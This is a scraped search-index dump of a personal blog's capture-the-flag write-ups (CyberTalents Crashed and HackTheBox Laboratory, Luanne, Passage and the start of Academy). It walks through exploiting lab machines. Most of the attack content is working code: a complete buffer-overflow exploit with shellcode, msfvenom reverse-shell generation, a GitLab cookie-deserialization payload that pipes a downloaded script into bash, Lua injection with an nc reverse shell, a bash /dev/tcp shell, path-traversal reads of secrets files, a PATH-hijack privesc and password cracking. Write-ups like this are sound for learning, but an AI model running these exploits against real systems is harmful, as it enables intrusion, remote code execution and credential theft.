/opt/metasploit/tools/exploit/pattern_create.rb -l 1300  Let\u0026rsquo;s send it again to the server\n#!/usr/bin/env python3 import socket ip = \u0026quot;192.168.1.14\u0026quot; port = 13337 prefix = \u0026quot;SECRET \u0026quot; offset = 0 payload = \u0026quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B\u0026quot; bufferx = prefix + payload s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\u0026quot;Sending...\u0026quot;) s.recv(1024) s.send(bytes(bufferx ,\u0026quot;latin-1\u0026quot;)) print(\u0026quot;Done!\u0026quot;) except: print(\u0026quot;Could not connect.\u0026quot;)  Once we send it, the server should be crashed!\nNow let\u0026rsquo;s find where exactly it got crashed!\n!mona findmsp -distance 1300  Now Mona should display a log window\nWe\u0026rsquo;re interested in the EIP register\n...snip... EIP contains normal pattern : 0x68423268 (offset 997) ...snip...  Our offset=997\nFinding Bad Characters  First, let\u0026rsquo;s create a bytearray with mona\n!mona bytearray -b \u0026quot;\\x00\u0026quot;  The output should be saved at c:\\mona\\super_secure_server\\bytearray.bin\n \\x00 is by default a bad characters, so we get rid of it from the beginning\n Let\u0026rsquo;s now generate our payload array\nfor x in range(1, 256): print(\u0026quot;\\\\x\u0026quot; + \u0026quot;{:02x}\u0026quot;.format(x), end='')  Now let\u0026rsquo;s send again our payload containing all the bad characters\n#!/usr/bin/env python3 import socket ip = \u0026quot;192.168.1.14\u0026quot; port = 13337 prefix = \u0026quot;SECRET \u0026quot; offset = 997 overflow = \u0026quot;A\u0026quot; * offset RETURN = \u0026quot;CCCC\u0026quot; padding = \u0026quot;\u0026quot; payload = \u0026quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026quot; postfix = \u0026quot;\u0026quot; bufferx = prefix + overflow + RETURN + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\u0026quot;Sending evil buffer...\u0026quot;) s.recv(1024) s.send(bytes(bufferx ,\u0026quot;latin-1\u0026quot;)) print(\u0026quot;Done!\u0026quot;) except: print(\u0026quot;Could not connect.\u0026quot;)  Now let\u0026rsquo;s compare the data that the ESP points to and the bytearray\n!mona compare -f c:\\mona\\super_secure_server\\bytearray.bin -a \u0026lt;ESP_addr\u0026gt;  We're a bit lucky here, there is no bad characters rather than the nullbyte! But in most cases we're gonna get them! To re-do the steps before with removing the bad character that we find!  PS: When you find 2/3 consecutive bad characters, just start by removing the first one. The bytes next to it may got overflowed ( anything can happen..)\n Finding a Jump Point  In our case only the nullbyte is a bad character\n!mona jmp -r esp -cpb \u0026quot;\\x00\u0026quot;  We can use anyone of these. We\u0026rsquo;ll be using it for the RETURN variable ( Little indian format)\nGenerate Payload  We\u0026rsquo;ll use msfvenom to generate it\n/opt/metasploit/msfvenom -p windows/shell_reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; EXITFUNC=thread -b \u0026quot;\\x00\u0026quot; -f py  Prepend NOPs  We used an encoder to generate the payload, so a space in memory is needed for the payload to unpack!\npadding = \u0026quot;\\x90\u0026quot; * 16  Final Exploit  #!/usr/bin/env python3 import socket ip = \u0026quot;3.121.99.159\u0026quot; port = 1887 prefix = \u0026quot;SECRET \u0026quot; offset = 997 overflow = \u0026quot;A\u0026quot; * offset retn = \u0026quot;\\xa0\\x12\\x50\\x62\u0026quot; padding = \u0026quot;\\x90\u0026quot; * 16 payload=\u0026quot;\u0026quot; payload+=\u0026quot;\\xdb\\xd9\\xb8\\xae\\xcc\\x38\\xcf\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9\\xb1\u0026quot; payload+=\u0026quot;\\x52\\x31\\x42\\x17\\x83\\xc2\\x04\\x03\\xec\\xdf\\xda\\x3a\\x0c\\x37\\x98\u0026quot; payload+=\u0026quot;\\xc5\\xec\\xc8\\xfd\\x4c\\x09\\xf9\\x3d\\x2a\\x5a\\xaa\\x8d\\x38\\x0e\\x47\u0026quot; --snip-- payload+=\u0026quot;\\x24\\xe8\\xaa\\x68\\xff\\xa8\\xcb\\x8a\\xd5\\xc4\\x63\\x13\\xbc\\x64\\xee\u0026quot; payload+=\u0026quot;\\xa4\\x6b\\xaa\\x17\\x27\\x99\\x53\\xec\\x37\\xe8\\x56\\xa8\\xff\\x01\\x2b\u0026quot; payload+=\u0026quot;\\xa1\\x95\\x25\\x98\\xc2\\xbf\u0026quot; postfix = \u0026quot;\u0026quot; bufferx = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\u0026quot;Sending evil buffer...\u0026quot;) s.recv(1024) s.send(bytes(bufferx ,\u0026quot;latin-1\u0026quot;)) print(\u0026quot;Done!\u0026quot;) except: print(\u0026quot;Could not connect.\u0026quot;)  We set our listener and get shell on the box\nAnd grab the flag Thanks for reading hope you enjoyed it! ","date":1618790400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1618790400,"objectID":"638b6969c9155d6234e6b8d0dc7e3b62","permalink":"https://mohamed-elleuch.me/writeups/ct-crashed/","publishdate":"2021-04-19T00:00:00Z","relpermalink":"/writeups/ct-crashed/","section":"writeups","summary":"Here's my writeup for the Hard rated machine Crashed from Cybertalents","tags":["CyberTalents"],"title":"CyberTalents - Crashed Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering   Nmap scan  sudo nmap -sC -sV 10.10.10.216 -v  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA) | 256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA) |_ 256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to https://laboratory.htb/ 443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: The Laboratory | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Issuer: commonName=laboratory.htb | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-07-05T10:39:28 | Not valid after: 2024-03-03T10:39:28 | MD5: 2873 91a5 5022 f323 4b95 df98 b61a eb6c |_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca | tls-alpn: |_ http/1.1 Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  We have 3 ports open:\n ssh: 22 running OpenSSH 8.2p1 http: 80 running Apache httpd 2.4.41 https: 443 running Apache httpd 2.4.41  2 Domains:\n laboratory.htb git.laboratory.htb   Web Enumeration\n  After adding laboratory.htb \u0026amp; git.laboratory.htb to /etc/hosts\n Let\u0026rsquo;s check laboratory.htb first\nWe got 2 usernames:\n Dexter DeeDee Dee_Dee ..   Skipping Gobuster scans, as it gave me nothing interesting\n Seems like it\u0026rsquo;s a static website, nothing much to see!\nLet\u0026rsquo;s move to git.laboratory.htb\nTried few logins but it failed, ( dexter:admin dexter:password )\nLet\u0026rsquo;s create our own account and see what we can do\nGitLab Community Edition 12.8.1\n Initial foothold   I think there are ready-to-use scripts to exploit this gitlab version, but we\u0026rsquo;ll do the process manually!\n Bascially we\u0026rsquo;re gonna abuse arbitrary file read via the UploadsRewriter when moving an issue, and get the secret_key_base from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml then generate the cookie payload via our own gitlab instance with the key that we got!\n If you wanna read more about this exploit: https://hackerone.com/reports/827052\n Let\u0026rsquo;s now try to read /etc/passwd from the box\n Let\u0026rsquo;s first create 2 projects   Let\u0026rsquo;s create an issue in one of these projets  ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)   Let\u0026rsquo;s now move it to the other project  And we get the file! Now let\u0026rsquo;s repeat the same thing to get /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml\n![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)  Let\u0026rsquo;s now setup our gitlab env!\n You can either download the gitlab package or use docker\n For this, I am going to use docker! First let\u0026rsquo;s pull the image\nsudo docker -D pull gitlab/gitlab-ce:12.8.1-ce.0  then run it !\nsudo docker run -it gitlab/gitlab-ce:12.8.1-ce.0 sh   PS: id command ; force of habit xD\n Let\u0026rsquo;s run\ngitlab-ctl reconfigure  Let\u0026rsquo;s change the /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml file with the one that we got! Now, let\u0026rsquo;s run\ngitlab-ctl restart gitlab-rails console  Here in the console, we\u0026rsquo;ll craft our cookie to gain access!\nOur payload to craft it:\nrequest = ActionDispatch::Request.new(Rails.application.env_config) request.env[\u0026quot;action_dispatch.cookies_serializer\u0026quot;] = :marshal cookies = request.cookie_jar erb = ERB.new(\u0026quot;\u0026lt;%= `curl http://10.10.14.3:8000/shell | bash` %\u0026gt;\u0026quot;) depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \u0026quot;@result\u0026quot;, ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie]  Final payload:\ncurl -vvv 'https://git.laboratory.htb/users/sign_in' -b \u0026quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiaCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4zOjgwMDAvc2hlbGwgfCBzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--a9181bfd8d26c33c9cf0c6fedcff269a3685902b\u0026quot; -k  Let\u0026rsquo;s set a listener, and grab that shell\n User PrivEsc  So now we\u0026rsquo;re on a docker container as the git user! The trick now is to change the gitlab\u0026rsquo;s admin (who is id=1) password\nGoing through gitlab\u0026rsquo;s docs to get the right syntax https://docs.gitlab.com/ee/security/reset_user_password.html\nIt may take a while to run\ngitlab-rails console -e production  user = User.find(1) user.password = 'password123' user.password_confirmation = 'password123' user.save!  Let\u0026rsquo;s login now with his account\nThere is a private repo that contains his home directory backup!\nLet\u0026rsquo;s copy his ssh private key and get into the box!\n Root PrivEsc  Let\u0026rsquo;s first run Linpeas! Going through the output, we can see that there is unusual suid binary let\u0026rsquo;s run Ltrace on this binary\nWe can abuse this binary, by creating a fake malicious chmod binary\necho \u0026quot;/bin/bash -p\u0026quot; \u0026gt; /tmp/chmod chmod 777 /tmp/chmod export PATH=/tmp:$PATH  Then we run the binary!\nAnd we rooted the box! Thanks for reading hope you enjoyed it! ","date":1618617600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1618617600,"objectID":"48bba9506635e20a1999d3fd32e75c6c","permalink":"https://mohamed-elleuch.me/writeups/htb-laboratory/","publishdate":"2021-04-17T00:00:00Z","relpermalink":"/writeups/htb-laboratory/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Laboratory, Which is an Easy Linux machine!","tags":["HackTheBox"],"title":"HackTheBox - Laboratory Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering   Nmap scan  sudo nmap -sC -sV 10.10.10.218 -v  As we can see above, We have 3 PORTS open:\n Port 22 running OpenSSH 8.0 ; Recent version, no need waste time on it Port 80 running nginx ; robots.txt \u0026ndash;\u0026gt; /weather Port 9001 running Medusa httpd 1.12 ; If we were on linux i think this should be something to look at   Skipping the gobuster part, it will only show us robots.txt. I do prefer Dirb when it comes to directory bruteforcing\n Dirb scan   You can clone the SecLists repo from here https://github.com/danielmiessler/SecLists\n We already got /weather/ from the nmap results, let\u0026rsquo;s see enum more\ndirb -R http://10.10.10.218/weather/ /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt   Foothold\n From our previous scans we were able to find\nhttp://10.10.10.218/weather/forecast/  Let's try it as a GET param Adding a causes an error  Skipping the SQL Injection part as it got me nothing\n Let\u0026rsquo;s now try if we have any potential code injection. Basically, The idea is to end the current lua command and inject. Another think to note for lua a comment starts anywhere with a double hyphen ( \u0026ndash; ) and runs until the end of the line.\nLet\u0026rsquo;s first try this payload\n/weather/forecast?city=London');print(\u0026quot;\\nhi\u0026quot;)--  That worked! Let's try if we can use system commands /weather/forecast?city=London');print(\u0026quot;\\n\u0026quot;);os.execute(\u0026quot;id\u0026quot;)--  That worked aswell! Let\u0026rsquo;s now get a reverse shell\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc ip port \u0026gt;/tmp/f  Final url encoded payload:\n/weather/forecast?city=%4c%6f%6e%64%6f%6e%27%29%3b%70%72%69%6e%74%28%22%5c%6e%22%29%3b%6f%73%2e%65%78%65%63%75%74%65%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%39%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66%22%29%2d%2d  Let\u0026rsquo;s execute it and get a shell on the box  User PrivEsc\n We can see that we have the default .htpasswd file which can contain potential passwords Let\u0026rsquo;s see what we got there echo \u0026quot;$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0\u0026quot; \u0026gt; hash ; john hash -w=/opt/rockyou.txt  And we cracked it! Let\u0026rsquo;s start by viewing the running processes\n You need to specify the w tag to view the whole command\n We can see that the user **r.michaels** is running a local server at port 3001! Let's exploit this to get his private SSH key! curl http://127.0.0.1:3001/~r.michaels/id_rsa  But we get 401 Unauthorized page!\nLet's try the credentials that we got earlier curl http://127.0.0.1:3001/~r.michaels/id_rsa --user webapi_user:iamthebest  And it worked! Let's login to the user And we grab that user flag!\nRoot PrivEsc\n An interesting backups file which contains an encrypted tar.gz file\nBecause we\u0026rsquo;re on an NetBSD box, we\u0026rsquo;re gonna use netpgp to decrypt then extract its content\nnetpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=backup.tar.gz  Let\u0026rsquo;s check that .htpasswd file! webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.\nLet\u0026rsquo;s crack this password with john!\nlittlebear\nLet\u0026rsquo;s try to switch to the root user with this password!\n https://www.vultr.com/docs/introduction-to-doas-on-NetBSD\n doas su  And we rooted the box!\n Bonus Section\n Let\u0026rsquo;s see what caused the lua injection!\ncat /home/r.michaels/devel/webapi/weather.lua  Going through the code we can see the injection point!\nhttpd.write('\u0026quot;error\u0026quot;: \u0026quot;unknown city: ' .. city .. '\u0026quot;}')  basically what we have done is\nhttpd.write('\u0026quot;error\u0026quot;: \u0026quot;unknown city: hi');os.execute(\u0026quot;id\u0026quot;) -- '\u0026quot;}')  To avoid this kind of injection, we should validate and sanitize the \u0026ldquo;city\u0026rdquo; input. Scanning the city variable for escape characters and special symbols, making a blacklist for any suspicious word {os,execute,print,\u0026hellip;} Or just by removing the \u0026lsquo;.. city ..\u0026rsquo; part!\nThanks for reading hope you enjoyed it! ","date":1616803200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1616803200,"objectID":"9c53dc83a837a6180559c8b9585b1542","permalink":"https://mohamed-elleuch.me/writeups/htb-luanne/","publishdate":"2021-03-27T00:00:00Z","relpermalink":"/writeups/htb-luanne/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Luanne, Which is an Easy NetBSD machine!","tags":["HackTheBox"],"title":"HackTheBox - Luanne Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering  Nmap scan  rustscan -a 10.10.10.206 -- -A -sC -sV\nOpen 10.10.10.206:22 Open 10.10.10.206:80  22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) | 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News   We have two ports open Port 22 : OpenSSH 7.2p2 Port 80 : Apache httpd 2.4.18 Exploring the WebServer  Let\u0026rsquo;s first add Passage.htb to our hosts file!\nWe can see that Fail2Ban is Implemented on the server! So no need to waste our time trying bruteforcing dirs and files\nWhat really catchs my eye is\nPowered by CuteNews\nA simple search on google can reveal the default dir for CuteNews CMS which is /CuteNews/\nLet\u0026rsquo;s see what we get! Nice! We got the CMS version\nPowered by CuteNews 2.1.2\nLet\u0026rsquo;s find a vulnerability related to this version!\nInitial Foothold  Let\u0026rsquo;s see what searchsploit has for us!\nLet\u0026rsquo;s grab that juicy RCE python exploit\nsearchsploit -m php/webapps/48800.py  And run our script, We only need to provide \thttp://passage.htb\npython3 48800.py  And we\u0026rsquo;re on the box!\nLet\u0026rsquo;s get a proper shell on the box!\n/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;IP\u0026gt;/\u0026lt;PORT\u0026gt; 0\u0026gt;\u0026amp;1'\nUser Privesc\n Paul user  Going through the webserver config, I found an interesting directory\n/var/www/html/CuteNews/cdata/users\nWhich seem to contain some juicy encoded informations\nIt looks like it\u0026rsquo;s Base64 encoded! Let\u0026rsquo;s decode it\na:1:{s:4:\u0026quot;name\u0026quot;;a:1:{s:5:\u0026quot;admin\u0026quot;;a:8:{s:2:\u0026quot;id\u0026quot;;s:10:\u0026quot;1592483047\u0026quot;;s:4:\u0026quot;name\u0026quot;;s:5:\u0026quot;admin\u0026quot;;s:3:\u0026quot;acl\u0026quot;;s:1:\u0026quot;1\u0026quot;;s:5:\u0026quot;email\u0026quot;;s:17:\u0026quot;nadav@passage.htb\u0026quot;;s:4:\u0026quot;pass\u0026quot;;s:64:\u0026quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1\u0026quot;;s:3:\u0026quot;lts\u0026quot;;s:10:\u0026quot;1592487988\u0026quot;;s:3:\u0026quot;ban\u0026quot;;s:1:\u0026quot;0\u0026quot;;s:3:\u0026quot;cnt\u0026quot;;s:1:\u0026quot;2\u0026quot;;}}}  a:1:{s:4:\u0026quot;name\u0026quot;;a:1:{s:10:\u0026quot;paul-coles\u0026quot;;a:9:{s:2:\u0026quot;id\u0026quot;;s:10:\u0026quot;1592483236\u0026quot;;s:4:\u0026quot;name\u0026quot;;s:10:\u0026quot;paul-coles\u0026quot;;s:3:\u0026quot;acl\u0026quot;;s:1:\u0026quot;2\u0026quot;;s:5:\u0026quot;email\u0026quot;;s:16:\u0026quot;paul@passage.htb\u0026quot;;s:4:\u0026quot;nick\u0026quot;;s:10:\u0026quot;Paul Coles\u0026quot;;s:4:\u0026quot;pass\u0026quot;;s:64:\u0026quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd\u0026quot;;s:3:\u0026quot;lts\u0026quot;;s:10:\u0026quot;1592485556\u0026quot;;s:3:\u0026quot;ban\u0026quot;;s:1:\u0026quot;0\u0026quot;;s:3:\u0026quot;cnt\u0026quot;;s:1:\u0026quot;2\u0026quot;;}}}  Seems like we got nadav and paul\u0026rsquo;s hash password\nIt\u0026rsquo;s a sha2-256 hash, we\u0026rsquo;re gonna use Hashcat with the rockyou wordlist to crack them!\necho \u0026quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1\u0026quot; \u0026gt; hash echo \u0026quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd\u0026quot; \u0026gt; hash  hashcat -m 1400 hash /opt/rockyou.txt  Seems like we were only able to crack paul\u0026rsquo;s hash!\npaul:atlanta1\nAnd grab our user flag\nNadav user  We can notice that nadav can access paul\u0026rsquo;s session\nLet\u0026rsquo;s see if paul\u0026rsquo;s can access nadav\u0026rsquo;s session\nssh nadav@passage  It worked!\nRoot Privesc\n Let\u0026rsquo;s first run\nps -aux  To see the current running processes! What really catches me is that root is running, and that\u0026rsquo;s odd\n/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper  A bit a searching/reading from google can lead us to something, which is the ability to get any file we want!\ngdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/id_rsa true  And we rooted the box!\nThanks for reading hope you enjoyed it! ","date":1614988800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1614988800,"objectID":"27c1e295548049232418c5d11b0dfc6e","permalink":"https://mohamed-elleuch.me/writeups/htb-passage/","publishdate":"2021-03-06T00:00:00Z","relpermalink":"/writeups/htb-passage/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Passage, Which is a Medium Linux machine!","tags":["HackTheBox"],"title":"HackTheBox - Passage Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering  Nmap scan  sudo nmap -sC -sV -T5 -oA nmap -O -A -v 10.10.10.215  As we see we have 2 ports open  SSH on port 22 running OpenSSH 8.2p1  http on port 80 running httpd 2.4.41  we notice as well the academy.htb domain, which we should add to /etc/hosts.\nGobuster scan  gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://academy.htb -x php  Initial Foothold\n Identifying the exploit\n So basically the first thing that tried was sql injection on  admin.php  but that didn\u0026rsquo;t give me any results. as we don\u0026rsquo;t have any potential users let\u0026rsquo;s move on and dig further. \nLet\u0026rsquo;s create an account and see if we can find any usernames and intercept it with burp\nPOST /register.php HTTP/1.1 Host: academy.htb Content-Length: 53 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://academy.htb Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://academy.htb/register.php Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: PHPSESSID=sdloh07q837vauvt0oqevack4o Connection: close uid=elleuch\u0026amp;password=elleuch\u0026amp;confirm=elleuch\u0026amp;roleid=0  We can notice the roleid\tparameter which is set to 0. we can assume that\u0026rsquo;s assigning a role to the user we\u0026rsquo;re creating. Which basically can be a normal user ( roleid=0 ) or a privileged user ( roleid=1 ).\nLet\u0026rsquo;s change change 0 to 1 and forward the request and create our privileged user and try to login to /admin.php\nAs we see above the planner leaks to us a subdomain dev-staging-01.academy.htb  Let\u0026rsquo;s add it to /etc/hosts and see what we get\nErrors! That sounds promosing! Scrolling down we can see something really interesting\nAPP_KEY\t\u0026quot;base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=\u0026quot;  We have the APP_KEY! We can abuse Laravel Unserialize 